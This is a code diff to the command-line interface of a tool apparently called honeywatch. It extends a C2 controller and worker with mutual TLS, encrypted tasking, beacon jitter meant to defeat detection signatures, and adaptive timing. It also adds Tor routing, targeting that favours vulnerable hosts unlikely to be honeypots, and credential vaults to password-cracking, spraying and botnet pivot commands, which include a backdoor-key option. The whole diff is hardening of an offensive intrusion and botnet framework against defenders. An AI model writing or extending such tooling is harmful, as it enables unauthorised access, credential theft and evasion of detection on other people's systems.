@@ -252,10 +252,36 @@ def build_parser() -> argparse.ArgumentParser:
         help="generate self-signed certs in ./certs before starting",
     )
     p_c2.add_argument(
+        "--generate-ca",
+        action="store_true",
+        help="generate an internal CA in ./certs and require worker client certs (mTLS)",
+    )
+    p_c2.add_argument(
+        "--ca",
+        default=None,
+        help="path to the internal CA cert; when set, the controller requires worker client certs signed by it (mTLS)",
+    )
+    p_c2.add_argument(
+        "--revoke-serial",
+        action="append",
+        default=None,
+        help="revoke a worker client cert by decimal serial (repeatable)",
+    )
+    p_c2.add_argument(
+        "--generate-worker-cert",
+        default=None,
+        metavar="WORKER_ID",
+        help="sign a worker client cert with the internal CA (use with --generate-ca "
+             "or --ca) and exit; prints the cert/key paths + CA pin for the worker config",
+    )
+    p_c2.add_argument(
         "--api-token",
         default=None,
         help="shared bearer secret; when set, every API + WS request must carry it",
     )
+    p_c2.add_argument("--c2-encrypt", action="store_true", help="encrypt C2 task/result traffic with NaCl or AES-256-GCM")
+    p_c2.add_argument("--c2-key", default=None, help="passphrase for C2 encryption (auto-generated if --c2-encrypt with no key)")
+    p_c2.add_argument("--generate-c2-key", action="store_true", help="generate a C2 encryption passphrase and exit")
     p_c2.add_argument(
         "--skip-vpn-check",
         action="store_true",
@@ -283,6 +309,18 @@ def build_parser() -> argparse.ArgumentParser:
     p_worker.add_argument(
         "--poll-interval", type=float, default=None, help="seconds between poll/claim attempts"
     )
+    p_worker.add_argument(
+        "--jitter",
+        type=float,
+        default=None,
+        help="beacon jitter fraction 0.0-1.0 (spread around poll-interval; defeats the metronomic-beacon signature)",
+    )
+    p_worker.add_argument(
+        "--max-backoff",
+        type=float,
+        default=None,
+        help="max seconds to back off on idle/controller errors (default 60.0)",
+    )
     p_worker.add_argument("--ssh-user", default=None, help="SSH user for ssh exec mode")
     p_worker.add_argument("--ssh-key", default=None, help="SSH private key path")
     p_worker.add_argument(
@@ -290,7 +328,30 @@ def build_parser() -> argparse.ArgumentParser:
         default=None,
         help="shared bearer secret to authenticate to the controller",
     )
+    p_worker.add_argument(
+        "--ca",
+        default=None,
+        help="path to the internal CA cert; when set, the worker verifies the controller against it (mTLS, CA pinning)",
+    )
+    p_worker.add_argument(
+        "--worker-cert",
+        default=None,
+        help="worker client cert (signed by the internal CA) for mTLS",
+    )
+    p_worker.add_argument(
+        "--worker-key",
+        default=None,
+        help="worker client key for mTLS (paired with --worker-cert)",
+    )
+    p_worker.add_argument(
+        "--ca-pin",
+        default=None,
+        help="expected sha256:<hex> fingerprint of the CA cert; if set, the CA file must match it (anti-substitution)",
+    )
     p_worker.add_argument("--config", default=None, help="path to a honeywatch TOML config")
+    p_worker.add_argument("--c2-encrypt", action="store_true", help="decrypt C2 tasks and encrypt results with NaCl or AES-256-GCM")
+    p_worker.add_argument("--c2-key", default=None, help="passphrase for C2 encryption (must match the controller's key)")
+    p_worker.add_argument("--adaptive-timing", action="store_true", help="adjust poll interval based on controller RTT (responsive=faster, slow=backoff)")
     p_worker.set_defaults(func=_cmd_worker)
 
     # ----------------------------- deploy --------------------------------
@@ -510,6 +571,18 @@ def build_parser() -> argparse.ArgumentParser:
         default=None,
         help="minimum final confidence when pulling targets from the store",
     )
+    p_crack.add_argument(
+        "--min-priority",
+        type=float,
+        default=None,
+        help="minimum priority score when pulling targets (0-1, combines vulnerability + low honeypot confidence)",
+    )
+    p_crack.add_argument(
+        "--sort-by",
+        choices=("confidence", "priority", "vulnerability"),
+        default="confidence",
+        help="sort targets by confidence (default), priority, or vulnerability score",
+    )
     p_crack.add_argument("--limit", type=int, default=None, help="max targets from the store")
     p_crack.add_argument(
         "--users",
@@ -581,6 +654,9 @@ def build_parser() -> argparse.ArgumentParser:
         action="store_true",
         help="bypass the Mullvad VPN gate",
     )
+    p_crack.add_argument("--tor", action="store_true", help="route crack traffic through local Tor SOCKS5 proxy")
+    p_crack.add_argument("--tor-port", type=int, default=9050, help="Tor SOCKS5 port (default 9050)")
+    p_crack.add_argument("--vault-passphrase", default=None, help="encrypt credentials at rest with AES-256-GCM")
     p_crack.add_argument("--config", default=None, help="path to a honeywatch TOML config")
     p_crack.set_defaults(func=_cmd_crack)
 
@@ -664,6 +740,8 @@ def build_parser() -> argparse.ArgumentParser:
         help="pull hosts from the store by final label",
     )
     p_spray.add_argument("--min-confidence", type=float, default=None)
+    p_spray.add_argument("--min-priority", type=float, default=None, help="minimum priority score for targets (0-1)")
+    p_spray.add_argument("--sort-by", choices=("confidence", "priority", "vulnerability"), default="confidence")
     p_spray.add_argument("--limit", type=int, default=None)
     p_spray.add_argument("--users", default=None, help="comma-separated usernames to spray")
     p_spray.add_argument("--user-file", default=None, help="file with usernames (one per line)")
@@ -692,11 +770,18 @@ def build_parser() -> argparse.ArgumentParser:
     )
     p_spray.add_argument("--proxy-file", default=None, help="file of socks5://[user:pass@]host:port proxies to round-robin")
     p_spray.add_argument("--jump-file", default=None, help="file of user@host SSH jumps to round-robin")
+    p_spray.add_argument("--tor", action="store_true", help="route spray traffic through local Tor SOCKS5 proxy (port 9050)")
+    p_spray.add_argument("--tor-port", type=int, default=9050, help="Tor SOCKS5 port (default 9050)")
     p_spray.add_argument("--host-concurrency", type=int, default=8, help="hosts sprayed in parallel (default 8)")
+    p_spray.add_argument(
+        "--max-user-attempts", type=int, default=0,
+        help="cap users tried per host per password round (0=unbounded; 5 matches common PAM maxretry)",
+    )
     p_spray.add_argument("--no-save", action="store_true", help="do not persist recovered creds")
     p_spray.add_argument("--json", action="store_true", help="emit results as a JSON array")
     p_spray.add_argument("--db", default=None, help="SQLite database path")
     p_spray.add_argument("--skip-vpn-check", action="store_true", help="bypass the Mullvad VPN gate")
+    p_spray.add_argument("--vault-passphrase", default=None, help="encrypt credentials at rest with AES-256-GCM")
     p_spray.add_argument("--config", default=None, help="path to a honeywatch TOML config")
     p_spray.set_defaults(func=_cmd_spray)
 
@@ -725,11 +810,15 @@ def build_parser() -> argparse.ArgumentParser:
     p_net.add_argument("--business-hours", action="store_true", help="only act inside 08:00-18:00 local")
     p_net.add_argument("--proxy-file", default=None, help="socks5:// pool to round-robin")
     p_net.add_argument("--jump-file", default=None, help="user@host SSH jumps to round-robin")
+    p_net.add_argument("--tor", action="store_true", help="route chain traffic through local Tor SOCKS5 proxy")
+    p_net.add_argument("--tor-port", type=int, default=9050, help="Tor SOCKS5 port (default 9050)")
     p_net.add_argument("--delay", type=float, default=0.0)
     p_net.add_argument("--jitter", type=float, default=0.5)
     p_net.add_argument("--lockout-delay", type=float, default=0.0)
     p_net.add_argument("--host-concurrency", type=int, default=8)
     p_net.add_argument("--min-confidence", type=float, default=0.7)
+    p_net.add_argument("--min-priority", type=float, default=None, help="minimum priority score for targets (0-1)")
+    p_net.add_argument("--sort-by", choices=("confidence", "priority", "vulnerability"), default="confidence")
     p_net.add_argument("--max-rounds", type=int, default=3,
                        help="pivot loops (default 3; 0 = run forever until growth exhausts)")
     p_net.add_argument("--backdoor-key", default=None,
@@ -740,6 +829,7 @@ def build_parser() -> argparse.ArgumentParser:
                        help="config TOML path; recon honors its scan tuning (ports, AI, scanner opts)")
     p_net.add_argument("--db", default=None, help="SQLite database path")
     p_net.add_argument("--skip-vpn-check", action="store_true")
+    p_net.add_argument("--vault-passphrase", default=None, help="encrypt credentials at rest with AES-256-GCM")
     p_net.add_argument("--json", action="store_true")
     p_net.set_defaults(func=_cmd_botnet)
 
@@ -1271,11 +1361,80 @@ def _cmd_c2(args, argv) -> int:
         if args.tls_key is None:
             args.tls_key = key
 
+    ca_path = args.ca or getattr(c2_cfg, "ca_path", None)
+    if args.generate_ca:
+        # Generate an internal CA. mTLS requires a server cert that *chains
+        # to the CA* (the worker's CA-pinned client context trusts only the CA,
+        # so a self-signed server cert would be rejected at the handshake). If
+        # the operator didn't pass --tls-cert/--tls-key, sign a server cert with
+        # the new CA so the chain validates. An existing --tls-cert is left in
+        # place (the operator is responsible for ensuring it chains to the CA).
+        from honeywatch.c2.ca import generate_ca, sign_server_cert
+
+        os.makedirs("certs", exist_ok=True)
+        ca_cert = os.path.join("certs", "honeywatch-ca.crt")
+        ca_key = os.path.join("certs", "honeywatch-ca.key")
+        generate_ca(ca_cert, ca_key)
+        print(f"generated internal CA: {ca_cert}, {ca_key}")
+        ca_path = ca_cert
+        if not args.tls_cert:
+            srv_cert = os.path.join("certs", "honeywatch-controller.crt")
+            srv_key = os.path.join("certs", "honeywatch-controller.key")
+            sign_server_cert(ca_cert, ca_key, srv_cert, srv_key)
+            print(f"generated CA-signed server cert: {srv_cert}, {srv_key}")
+            args.tls_cert, args.tls_key = srv_cert, srv_key
+
+    # Mint a worker client cert signed by the internal CA, then exit. The
+    # operator distributes the worker cert/key + CA (and ca_pin) to the worker
+    # host and configures --ca/--worker-cert/--worker-key/--ca-pin there.
+    if args.generate_worker_cert:
+        from honeywatch.c2.ca import ca_pin_from_cert, sign_worker_cert
+
+        if not ca_path or not os.path.isfile(ca_path):
+            print(
+                "honeywatch: --generate-worker-cert needs an internal CA; "
+                "pass --generate-ca (to create one) or --ca <path> (existing).",
+                file=sys.stderr,
+            )
+            return 2
+        ca_key_path = os.path.join(os.path.dirname(ca_path), "honeywatch-ca.key")
+        if not os.path.isfile(ca_key_path):
+            print(
+                f"honeywatch: CA key not found at {ca_key_path!r}; the CA cert "
+                "exists but its key is needed to sign worker certs.",
+                file=sys.stderr,
+            )
+            return 2
+        w_cert = os.path.join("certs", f"{args.generate_worker_cert}.crt")
+        w_key = os.path.join("certs", f"{args.generate_worker_cert}.key")
+        sign_worker_cert(ca_path, ca_key_path, w_cert, w_key,
+                         worker_id=args.generate_worker_cert)
+        pin = ca_pin_from_cert(ca_path)
+        print(f"generated worker cert for {args.generate_worker_cert!r}:")
+        print(f"  worker cert : {w_cert}")
+        print(f"  worker key  : {w_key}")
+        print(f"  CA cert     : {ca_path}")
+        print(f"  CA pin     : {pin}")
+        print("Configure the worker with: --ca {ca} --worker-cert {cert} "
+              "--worker-key {key} --ca-pin {pin}".format(
+                  ca=ca_path, cert=w_cert, key=w_key, pin=pin))
+        return 0
+
     cert = args.tls_cert or getattr(c2_cfg, "tls_cert", None)
     key = args.tls_key or getattr(c2_cfg, "tls_key", None)
     api_token = args.api_token or getattr(c2_cfg, "api_token", None)
 
-    from honeywatch.c2 import Controller, C2Store, build_ssl_context
+    # Handle --generate-c2-key: generate and print a passphrase, then exit.
+    if args.generate_c2_key:
+        import secrets
+        key = secrets.token_urlsafe(32)
+        print(key)
+        return 0
+
+    c2_encrypt = args.c2_encrypt or getattr(c2_cfg, "c2_encrypt", False)
+    c2_key = args.c2_key or getattr(c2_cfg, "c2_key", None)
+
+    from honeywatch.c2 import C2Store, Controller, build_mtls_server_ssl_context, build_ssl_context
     from honeywatch.c2.controller import HAS_AIOHTTP
 
     if not HAS_AIOHTTP:
@@ -1287,9 +1446,18 @@ def _cmd_c2(args, argv) -> int:
         return 1
 
     store = C2Store(db_path)
-    ssl_ctx = build_ssl_context(cert, key)
+    # When a CA is configured, build an mTLS server context (requires client
+    # certs signed by that CA). Otherwise a plain server-TLS context (or None
+    # for plaintext lab use).
+    if ca_path:
+        ssl_ctx = build_mtls_server_ssl_context(cert, key, ca_path)
+    else:
+        ssl_ctx = build_ssl_context(cert, key)
+    revoked = set(int(s) for s in (args.revoke_serial or []))
     controller = Controller(store, host=host, port=port, ssl_context=ssl_ctx,
-                            api_token=api_token)
+                            api_token=api_token, ca_path=ca_path,
+                            revoked_serials=revoked,
+                            c2_encrypt=c2_encrypt, c2_key=c2_key)
     try:
         _maybe_await(controller.run())
     except KeyboardInterrupt:
@@ -1319,6 +1487,16 @@ def _cmd_worker(args, argv) -> int:
         if args.poll_interval is not None
         else getattr(workers_cfg, "poll_interval", 5.0)
     )
+    jitter_fraction = (
+        args.jitter
+        if args.jitter is not None
+        else getattr(workers_cfg, "jitter_fraction", 0.2)
+    )
+    max_backoff = (
+        args.max_backoff
+        if args.max_backoff is not None
+        else getattr(workers_cfg, "max_backoff", 60.0)
+    )
     ssh_user = args.ssh_user if args.ssh_user is not None else getattr(
         workers_cfg, "ssh_user", "root"
     )
@@ -1326,6 +1504,12 @@ def _cmd_worker(args, argv) -> int:
         workers_cfg, "ssh_key", None
     )
     api_token = args.api_token or getattr(workers_cfg, "api_token", None)
+    ca_path = args.ca or getattr(workers_cfg, "ca_path", None)
+    worker_cert = args.worker_cert or getattr(workers_cfg, "worker_cert", None)
+    worker_key = args.worker_key or getattr(workers_cfg, "worker_key", None)
+    ca_pin = args.ca_pin or getattr(workers_cfg, "ca_pin", None)
+    c2_encrypt = args.c2_encrypt or getattr(workers_cfg, "c2_encrypt", False)
+    c2_key = args.c2_key or getattr(workers_cfg, "c2_key", None)
 
     from honeywatch.c2 import Worker
 
@@ -1337,8 +1521,18 @@ def _cmd_worker(args, argv) -> int:
         ssh_user=ssh_user,
         ssh_key=ssh_key,
         api_token=api_token,
+        jitter_fraction=jitter_fraction,
+        max_backoff=max_backoff,
+        ca_path=ca_path,
+        worker_cert=worker_cert,
+        worker_key=worker_key,
+        ca_pin=ca_pin,
+        c2_encrypt=c2_encrypt,
+        c2_key=c2_key,
+        adaptive_timing=args.adaptive_timing or getattr(workers_cfg, "adaptive_timing", False),
     )
-    print(f"honeywatch worker: connecting to {url} (categories={categories})")
+    scheme = "mTLS" if ca_path else ("TLS" if url.lower().startswith("https") else "plaintext")
+    print(f"honeywatch worker: connecting to {url} (categories={categories}, {scheme})")
     try:
         _maybe_await(worker.run())
     except KeyboardInterrupt:
@@ -1664,7 +1858,8 @@ def _cmd_crack(args, argv) -> int:
     save_credentials = (not args.no_save) and bool(getattr(crack_cfg, "save_credentials", True))
 
     db_path = args.db or getattr(cfg.storage, "db", "honeywatch.db")
-    store = Store(db_path)
+    vault_pass = args.vault_passphrase or getattr(getattr(cfg, "storage", None), "vault_passphrase", None)
+    store = Store(db_path, vault_passphrase=vault_pass)
 
     users: list[str] = []
     if args.user:
